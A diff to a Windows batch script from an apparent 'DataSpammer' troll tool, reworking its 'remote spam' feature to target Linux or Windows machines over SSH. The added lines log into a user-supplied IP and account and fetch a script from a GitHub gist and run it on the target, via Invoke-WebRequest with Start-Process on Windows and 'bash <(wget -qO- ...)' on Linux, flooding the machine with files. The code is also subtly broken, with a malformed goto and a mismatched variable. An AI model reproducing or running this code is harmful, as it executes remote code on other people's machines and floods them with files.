@@ -760,7 +760,7 @@ goto restart-script
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo [3] Remote Spam (Under developement)
+    echo [3] Spam Linux/Windows via SSH CURRENTLY ONLY WITH NO PASSWORD
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
@@ -779,21 +779,15 @@ goto restart-script
 
 :remotespam
     :: Not working - TLI For remotespam
-    echo In Order to work the Remote Spam Method needs 6 components.
+    echo In Order to work the Remote Spam Method needs 4 Things.
     @ping -n 1 localhost> nul
     echo 1: The IP of the Device you want to spam
     @ping -n 1 localhost> nul
-    echo 2: The Account you want to Use
+    echo 2: An Accountname
     @ping -n 1 localhost> nul
-    echo 3: The Passwort of the Account you want to spam
+    echo 3: The Passwort of the Account
     @ping -n 1 localhost> nul
-    echo 4: A Filename
-    @ping -n 1 localhost> nul
-    echo 5: The Directory you want to Spam.
-    @ping -n 1 localhost> nul
-    echo 6: How many Files you want to create
-    @ping -n 1 localhost> nul
-    echo The Device has to be turned on too and has to be connected to the Internet. It has to accept the connection too. 
+    echo 4: How many Files you want to create
     @ping -n 1 localhost> nul
     echo.
     echo. 
@@ -802,10 +796,10 @@ goto restart-script
     echo [2] Back
     echo.
     set /P remotespamchoose=Choose an Option from above:
-    if %remotespamchoose% == 1 goto remotespamsetupfirst
+    if %remotespamchoose% == 1 goto ssh-spam-info
     if %remotespamchoose% == 2 goto start187
 
-:remotespamsetupfirst
+:ssh-spam-info
     :: Ask the User to enter the IP - supported with arp
     echo Please specify the IP of the Device
     @ping -n 1 localhost> nul
@@ -817,35 +811,33 @@ goto restart-script
     echo.
     @ping -n 1 localhost> nul
     echo.
-    set /P remotespamip=Enter the IP:
-    if %remotespamip% == help (
+    set /P ssh-ip=Enter the IP:
+    if %ssh-ip% == help (
         start "" "https://support.ucsd.edu/services?id=kb_article_view&sysparm_article=KB0032480"
     ) else (
-        goto remotespamsetup
+        goto ssh-spam-setup
     )
-:remotespamsetup
+:ssh-spam-setup
     :: Check if IP is valid
     setlocal enabledelayedexpansion
-    echo !remotespamip! | findstr /R "^([0-9]{1,3}\.){3}[0-9]{1,3}$"
+    echo !ssh-ip! | findstr /R "^([0-9]{1,3}\.){3}[0-9]{1,3}$"
     if %errorlevel% equ 0 (
-        goto remotespamsetup2
+        goto ssh-spam-setup-2
     ) else (
         echo The IP you entered doesnt seem Valid. Please try again.
         pause
-        goto remotespamsetupfirst
+        gotossh-spam-info
     )
 
-:remotespamsetup2
+:ssh-spam-setup-2
     :: Enter other things needed for Remotespam
-    set /P remotespamaccname=Enter an Account Name:
-    set /P remotespampasswrd=Enter the Password of the Account:
-    echo The Filename cant include the following Character(s):\ / : * ? " < > |"
-    set /P remotespamfilename=Enter a Filename:
-    set /P remotespamfilecount=How many files do you want to create:
+    set /P ssh-name=Enter an Account Name:
+    rem set /P ssh-pswd=Enter the Password of the Account:
+    set /P ssh-filecount=How many files do you want to create:
     call :verify
     cls
 
-:startremotespam
+:start-ssh
     :: 100% UD ASSET COUNTER (Does nothing)
     set "assetcount=1"
     :assetcounttop
@@ -854,30 +846,33 @@ goto restart-script
     echo Loading Assets [%assetcount%/32]
     set /a "assetcount+=1"
     cls
-    If %assetcount% == 33 (goto remotespamstart) else (goto assetcounttop)
+    If %assetcount% == 33 (goto ssh-start-spam) else (goto assetcounttop)
 
-:remotespamstart
-    :: remotespam countdown
-    echo 3
-    @ping -n 2 localhost> nul
-    echo 2
-    @ping -n 2 localhost> nul
-    echo 1
-    @ping -n 2 localhost> nul
-    echo Starting.....
-    @ping -n 2 localhost> nul
-    set "remotespamcount=1"
-    cd %temp%
-    echo Troll by https://github.com/PIRANY1/DataSpammer > dataspammertemp.txt
-:startremotespamwasset
-    :: remotespam executor
-    scp file.txt root@serverip:~/file.txt
-    scp %temp%\dataspammertemp.txt %remotespamaccname%@%remotespamip%:Desktop\%remotespamfilename%_%remotespamcount%.txt
-    %remotespampasswrd%
-    set /a "remotespamcount+=1"
-    if %remotespamfilecount% == %remotespamcount% (goto remotespamdone) else (goto startremotespamwasset)
+:ssh-start-spam
+    echo Is the SSH Target based on Linux or Windows?
+    echo.
+    echo [1] Windows
+    echo.
+    echo [2] Linux
+    echo.
+    echo.
+    set /P linux-win-ssh=Choose an Option from Above:
+    if %linux-win-ssh% == 1 goto spam-ssh-target-win
+    if %linux-win-ssh% == 2 goto spam-ssh-target-lx
 
-:remotespamdone
+:spam-ssh-target-win
+set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
+ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
+echo Successfully executed SSH Connection.
+goto ssh-done
+
+:spam-ssh-target-lx
+set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
+ssh %ssh-name%@%ssh-ip% "%ssh_command%"
+echo Successfully executed SSH Connection.
+goto ssh-done
+
+:ssh-done
     :: Remote Spam Done TLI
     echo.
     %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
@@ -891,7 +886,7 @@ goto restart-script
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo The Script Created %remotespamfilecount% Files on the PC of %remotespamaccname%
+    echo The Script Created %ssh-filecount% Files on the PC of %ssh-name%
     echo.
     @ping -n 1 localhost> nul
     echo.
@@ -911,7 +906,7 @@ goto restart-script
     set /p menu9=Choose an Option from Above:
     If %menu9% == 1 goto cancel
     If %menu9% == 2 goto menu
-    goto remotespamdone
+    goto ssh-done
 
 :deskiconspam
     :: Desktop Spam Start TLI
